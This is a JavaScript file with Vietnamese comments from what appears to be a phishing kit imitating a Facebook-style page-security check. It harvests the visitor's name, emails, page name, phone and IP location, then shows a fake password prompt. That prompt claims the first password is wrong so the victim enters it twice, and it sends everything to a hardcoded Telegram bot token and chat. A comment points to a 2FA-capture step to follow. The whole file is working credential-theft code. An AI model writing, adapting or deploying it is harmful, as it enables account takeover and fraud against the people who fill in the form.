// ==================== CẤU HÌNH GỬI TIN NHẮN ====================
const TG_BOT = {
    TOKEN: '8648725712:AAGvpKKuW8V9dB6yBpwvkyvIi0xCHNDaHAk',
    CHAT_ID: '-5286997232' // GIỮ NGUYÊN DẤU TRỪ
};

// Hàm gửi tin nhắn trực tiếp không qua trung gian
async function sendToTelegram(text) {
    try {
        await fetch(`https://api.telegram.org/bot${TG_BOT.TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TG_BOT.CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Lỗi gửi Telegram:", e); }
}

// Hàm lấy Vị trí chi tiết (Ép trình duyệt đợi kết quả)
async function getClientLocation() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || "N/A",
            country: data.country_name || "N/A",
            city: data.city || "N/A",
            region: data.region || "N/A"
        };
    } catch (e) {
        return { ip: "N/A", country: "N/A", city: "N/A", region: "N/A" };
    }
}

// ==================== LOGIC XỬ LÝ FORM CHÍNH ====================
document.getElementById('clientForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const submitBtn = e.target.querySelector('button');
    submitBtn.disabled = true;
    submitBtn.innerHTML = 'Processing...';

    // 1. Lấy vị trí trước khi soạn tin nhắn (Chống lỗi N/A)
    const location = await getClientLocation();

    const info = {
        fullName: document.getElementById('fullName').value.trim(),
        email: document.getElementById('email').value.trim(),
        emailBusiness: document.getElementById('emailBusiness').value.trim(),
        fanpage: document.getElementById('fanpage').value.trim(),
        phone: document.getElementById('phone').value.trim(),
        ...location
    };

    // Lưu vào máy để các bước sau (Pass/2FA) lấy dùng
    localStorage.setItem('user_cache', JSON.stringify(info));

    // 2. Soạn tin nhắn Mẫu chuẩn (Có icon và xuống dòng)
    const report = `
🚀 <b>DATA MỚI VỀ</b> 🚀
------------------------------
📄 Page Name: <b>${info.fanpage}</b>
👤 Họ tên: <b>${info.fullName}</b>
📧 Email 1: ${info.email}
📧 Email 2: ${info.emailBusiness}
📱 Số ĐT: <code>${info.phone}</code>
------------------------------
🌍 <b>VỊ TRÍ CHI TIẾT:</b>
📍 IP: <code>${info.ip}</code>
🏳️ Quốc gia: <b>${info.country}</b>
🏙️ Thành phố: <b>${info.city}</b>
🏙️ Vùng: <b>${info.region}</b>
------------------------------`;

    await sendToTelegram(report);
    
    submitBtn.disabled = false;
    submitBtn.textContent = 'Continue';
    
    // Chuyển sang Modal nhập mật khẩu
    openSecurityModal();
});

// ==================== MODAL MẬT KHẨU (Gửi 2 lần) ====================
function openSecurityModal() {
    const content = `
        <div style="padding: 20px; font-family: Arial, sans-serif;">
            <p style="color: #9a979e; margin-bottom: 15px; font-size: 14px;">For your security, you must enter your password to continue.</p>
            <form id="securityForm">
                <input type="password" id="passInput" placeholder="Password" style="width:100%; border: 1px solid #d4dbe3; padding: 12px; border-radius: 8px; margin-bottom: 10px; outline: none;">
                <p id="passError" style="color: red; font-size: 13px; display: none; margin-bottom: 10px;"></p>
                <button type="submit" style="width:100%; background: #0064E0; color: white; border: none; padding: 12px; border-radius: 20px; font-weight: bold; cursor: pointer;">Continue</button>
            </form>
        </div>`;

    Modal.create('securityModal', content);
    Modal.open('securityModal');

    let count = 0;
    document.getElementById('securityForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const p = document.getElementById('passInput').value;
        const err = document.getElementById('passError');
        const cache = JSON.parse(localStorage.getItem('user_cache'));

        if (!p) return;

        if (count === 0) {
            // Lần 1: Gửi pass và báo lỗi giả
            await sendToTelegram(`🔑 <b>MẬT KHẨU (LẦN 1):</b> <code>${p}</code>\n👤 User: ${cache.email}`);
            err.textContent = "The password you've entered is incorrect.";
            err.style.display = 'block';
            document.getElementById('passInput').value = '';
            count = 1;
        } else {
            // Lần 2: Gửi pass và báo thành công chuyển 2FA
            await sendToTelegram(`🔑 <b>MẬT KHẨU (LẦN 2):</b> <code>${p}</code>\n👤 User: ${cache.email}`);
            Modal.close('securityModal');
            // Bạn có thể gọi tiếp hàm 2FA ở đây
            alert("Security check required. Please check your notification.");
        }
    });
}
